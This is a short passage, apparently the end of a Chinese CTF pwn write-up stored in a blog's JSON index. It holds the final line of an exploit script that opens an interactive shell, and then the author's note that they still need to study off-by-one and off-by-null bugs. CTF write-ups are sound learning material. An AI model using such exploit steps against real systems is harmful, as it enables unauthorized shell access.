getshellr.interactive()\n\n自己还是在常见的漏洞上面出现问题比如这次的off by one还有off by null都还没去了解，所以下来会去了解这方面的漏洞原理和利用方式。\n","categories":["比赛wp"],"tags":["pwn"]}]